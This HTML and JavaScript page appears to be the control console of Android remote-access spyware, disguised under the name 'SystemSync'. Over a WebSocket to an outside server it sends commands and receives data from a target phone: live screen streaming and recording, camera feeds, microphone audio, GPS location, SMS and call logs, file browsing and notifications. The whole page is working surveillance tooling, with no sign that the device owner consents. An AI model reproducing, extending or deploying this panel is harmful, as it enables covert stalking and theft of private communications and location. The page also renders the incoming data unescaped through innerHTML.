<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemSync - Master Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #0f0f0f; color: #e0e0e0; margin: 0; padding: 20px; 
            display: flex; flex-direction: column; align-items: center;
        }

        /* Header & Status */
        .header { display: flex; align-items: center; gap: 20px; margin-bottom: 20px; width: 100%; max-width: 1200px; }
        .status-badge { 
            background: #1a1a1a; padding: 8px 15px; border-radius: 20px; 
            display: flex; align-items: center; font-size: 14px; border: 1px solid #333;
        }
        .status-dot { height: 10px; width: 10px; border-radius: 50%; margin-right: 8px; background: #555; transition: 0.3s; }
        .online { background: #00ff00; box-shadow: 0 0 10px #00ff00; }
        .offline { background: #ff0000; }

        /* Main Grid Layout */
        .dashboard-grid {
            display: grid;
            grid-template-columns: 360px 1fr;
            grid-template-rows: auto 1fr;
            gap: 20px;
            width: 100%;
            max-width: 1300px;
        }

        /* Viewport Window */
        #viewport-container {
            grid-row: span 2;
            background: #000; border: 8px solid #222; border-radius: 25px;
            height: 700px; overflow: hidden; position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
        }
        #display { width: 100%; height: 100%; object-fit: contain; }

        /* Control Panel */
        .controls-card {
            background: #1a1a1a; border: 1px solid #333; border-radius: 15px; padding: 15px;
            display: flex; flex-wrap: wrap; gap: 10px;
        }

        /* Window Grid for Data */
        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }

        .window {
            background: #161616; border: 1px solid #333; border-radius: 12px;
            height: 300px; display: flex; flex-direction: column; overflow: hidden;
        }
        .window-header {
            background: #222; padding: 10px 15px; font-size: 12px; font-weight: bold;
            border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center;
            text-transform: uppercase; letter-spacing: 1px;
        }
        .window-content { padding: 10px; overflow-y: auto; flex-grow: 1; font-family: 'Consolas', monospace; font-size: 12px; color: #00ff00; }

        /* Buttons */
        button { 
            padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; 
            font-weight: 600; font-size: 11px; transition: 0.2s; color: white;
            text-transform: uppercase;
        }
        .btn-green { background: #27ae60; }
        .btn-red { background: #c0392b; }
        .btn-blue { background: #2980b9; }
        .btn-purple { background: #8e44ad; }
        .btn-orange { background: #d35400; }
        .btn-small { padding: 4px 8px; font-size: 10px; background: #333; }
        
        .recording-active { animation: pulse 1.5s infinite; background: #e74c3c !important; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

        /* Map Styles */
        #map { width: 100%; height: 100%; background: #111; }
        
        .log-entry { border-bottom: 1px solid #222; padding: 5px 0; }
        .file-item { display: flex; justify-content: space-between; padding: 4px; cursor: pointer; border-radius: 4px; }
        .file-item:hover { background: #222; }

        #toast {
            visibility: hidden; min-width: 250px; background: #f39c12; color: #000;
            text-align: center; border-radius: 5px; padding: 16px; position: fixed;
            z-index: 1000; left: 50%; bottom: 30px; transform: translateX(-50%);
            font-weight: bold;
        }
        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
        @keyframes fadein { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } }
        @keyframes fadeout { from { bottom: 30px; opacity: 1; } to { bottom: 0; opacity: 0; } }
    </style>
</head>
<body>

    <div class="header">
        <h2>SystemSync Console</h2>
        <div class="status-badge">
            <span id="status-dot" class="status-dot"></span>
            <span id="status-text">Connecting...</span>
        </div>
    </div>

    <div class="dashboard-grid">
        <div id="viewport-container">
            <img id="display" src="" alt="View Standby" />
        </div>

        <div style="display: flex; flex-direction: column; gap: 20px;">
            <div class="controls-card">
                <button id="toggleBtn" class="btn-green" onclick="toggleScreen()">START SCREEN</button>
                <button class="btn-blue" onclick="handleScreenshot()">SCREENSHOT</button>
                <button id="recordBtn" class="btn-orange" onclick="handleRecording()">START RECORDING</button>
                <button class="btn-purple" onclick="sendCommand('START_CAM:BACK')">BACK CAM</button>
                <button class="btn-purple" onclick="sendCommand('START_CAM:FRONT')">FRONT CAM</button>
                <button id="micBtn" class="btn-blue" style="background:#2c3e50" onclick="toggleMic()">LISTEN MIC</button>
                <button class="btn-red" style="flex-grow:1" onclick="sendCommand('STOP_ALL')">STOP ALL</button>
            </div>

            <div class="data-grid">
                <div class="window" style="height: 350px; grid-column: span 2;">
                    <div class="window-header">
                        <span>üìç Live GPS Location</span>
                        <button class="btn-small" onclick="sendCommand('GET_GPS')">TRACK</button>
                    </div>
                    <div id="map" class="window-content" style="padding:0"></div>
                </div>

                <div class="window">
                    <div class="window-header">
                        <span>üí¨ SMS Logs</span>
                        <button class="btn-small" onclick="sendCommand('GET_SMS')">REFRESH</button>
                    </div>
                    <div id="sms-win" class="window-content">No data...</div>
                </div>

                <div class="window">
                    <div class="window-header">
                        <span>üìû Call History</span>
                        <button class="btn-small" onclick="sendCommand('GET_CALLS')">REFRESH</button>
                    </div>
                    <div id="call-win" class="window-content">No data...</div>
                </div>

                <div class="window">
                    <div class="window-header">
                        <span>üìÅ File Browser</span>
                        <button class="btn-small" onclick="sendCommand('GET_FILES:/sdcard/')">ROOT</button>
                    </div>
                    <div id="file-win" class="window-content">Select Root...</div>
                </div>

                <div class="window">
                    <div class="window-header">
                        <span>üîî Notifications</span>
                    </div>
                    <div id="notif-win" class="window-content">Listening...</div>
                </div>
            </div>
        </div>
    </div>

    <div id="toast">Enable screen first</div>
    <canvas id="hidden-canvas" style="display:none"></canvas>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const WS_URL = "wss://mirror-view.onrender.com";
        const display = document.getElementById('display');
        const statusDot = document.getElementById('status-dot');
        const statusText = document.getElementById('status-text');
        const toggleBtn = document.getElementById('toggleBtn');
        const recordBtn = document.getElementById('recordBtn');
        const micBtn = document.getElementById('micBtn');

        let ws, isStreaming = false, isRecording = false, isMicOn = false;
        let mediaRecorder, recordedChunks = [];
        const canvas = document.getElementById('hidden-canvas');
        const ctx = canvas.getContext('2d');

        // GPS Map Initialization
        const map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '¬© OpenStreetMap' }).addTo(map);
        let marker = L.marker([0, 0]).addTo(map);

        function connect() {
            ws = new WebSocket(WS_URL);
            ws.onopen = () => { ws.send("I_AM_WEB"); updateStatus("ONLINE"); };
            ws.onmessage = (e) => {
                const msg = e.data;
                if (msg.startsWith("FRAME:") && isStreaming) {
                    display.src = "data:image/jpeg;base64," + msg.substring(6);
                    if (isRecording) ctx.drawImage(display, 0, 0, canvas.width, canvas.height);
                } 
                else if (msg.startsWith("STATUS:")) updateStatus(msg.split(":")[1]);
                else if (msg.startsWith("GPS_DATA:")) updateGPS(msg.substring(9));
                else if (msg.startsWith("SMS_DATA:")) updateWindow('sms-win', msg.substring(9));
                else if (msg.startsWith("CALL_DATA:")) updateWindow('call-win', msg.substring(10));
                else if (msg.startsWith("FILE_DATA:")) updateFiles(msg.substring(10));
                else if (msg.startsWith("NOTIF:")) updateWindow('notif-win', msg.substring(6), true);
                else if (msg.startsWith("AUDIO:")) playAudio(msg.substring(6));
            };
            ws.onclose = () => { updateStatus("OFFLINE"); setTimeout(connect, 3000); };
        }

        function sendCommand(cmd) { if (ws && ws.readyState === 1) ws.send(cmd); }

        function updateStatus(status) {
            if (status === "ONLINE") {
                statusDot.className = "status-dot online";
                statusText.innerText = "Device Connected";
            } else {
                statusDot.className = "status-dot offline";
                statusText.innerText = "Device Offline";
                isStreaming = false;
            }
        }

        function toggleScreen() {
            if (!isStreaming) {
                sendCommand("START_SCREEN");
                toggleBtn.innerText = "STOP SCREEN";
                toggleBtn.className = "btn-red";
                isStreaming = true;
            } else {
                sendCommand("STOP_SCREEN");
                toggleBtn.innerText = "START SCREEN";
                toggleBtn.className = "btn-green";
                isStreaming = false;
                display.src = "";
            }
        }

        // --- Data Updates ---
        function updateWindow(id, data, append = false) {
            const win = document.getElementById(id);
            const entry = `<div class="log-entry">${data}</div>`;
            if (append) win.insertAdjacentHTML('afterbegin', entry);
            else win.innerHTML = entry;
        }

        function updateGPS(coords) {
            const [lat, lng] = coords.split(',').map(Number);
            const pos = [lat, lng];
            map.setView(pos, 15);
            marker.setLatLng(pos);
            marker.bindPopup(`Device Location: ${lat}, ${lng}`).openPopup();
        }

        function updateFiles(jsonStr) {
            const win = document.getElementById('file-win');
            try {
                const files = JSON.parse(jsonStr);
                win.innerHTML = files.map(f => `
                    <div class="file-item" onclick="sendCommand('GET_FILES:${f.path}/')">
                        <span>${f.isDir ? 'üìÅ' : 'üìÑ'} ${f.name}</span>
                        <small>${f.size || ''}</small>
                    </div>
                `).join('');
            } catch(e) { win.innerText = jsonStr; }
        }

        // --- Existing Features ---
        function handleScreenshot() {
            if (!isStreaming) { document.getElementById('toast').className="show"; setTimeout(()=>document.getElementById('toast').className="",3000); return; }
            const link = document.createElement('a');
            link.download = `shot_${Date.now()}.png`;
            link.href = display.src;
            link.click();
        }

        function handleRecording() {
            if (!isStreaming) return;
            if (!isRecording) {
                canvas.width = display.naturalWidth || 360;
                canvas.height = display.naturalHeight || 640;
                const stream = canvas.captureStream(25);
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                recordedChunks = [];
                mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const a = document.createElement('a');
                    a.href = URL.createObjectURL(blob);
                    a.download = `rec_${Date.now()}.webm`;
                    a.click();
                };
                mediaRecorder.start();
                isRecording = true;
                recordBtn.innerText = "STOP RECORDING";
                recordBtn.classList.add('recording-active');
            } else {
                mediaRecorder.stop();
                isRecording = false;
                recordBtn.innerText = "START RECORDING";
                recordBtn.classList.remove('recording-active');
            }
        }

        // --- Audio Logic ---
        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function toggleMic() {
            isMicOn = !isMicOn;
            if (isMicOn) { sendCommand("START_AUDIO"); micBtn.style.background = "#c0392b"; micBtn.innerText = "MIC ON"; }
            else { sendCommand("STOP_AUDIO"); micBtn.style.background = "#2c3e50"; micBtn.innerText = "LISTEN MIC"; }
        }
        function playAudio(base64) {
            const binary = atob(base64);
            const bytes = new Int16Array(binary.length / 2);
            for (let i = 0; i < bytes.length; i++) bytes[i] = (binary.charCodeAt(i*2+1) << 8) | binary.charCodeAt(i*2);
            const buffer = audioCtx.createBuffer(1, bytes.length, 44100);
            buffer.getChannelData(0).set(Array.from(bytes).map(v => v / 32768));
            const source = audioCtx.createBufferSource();
            source.buffer = buffer; source.connect(audioCtx.destination); source.start();
        }

        connect();
    </script>
</body>
</html>
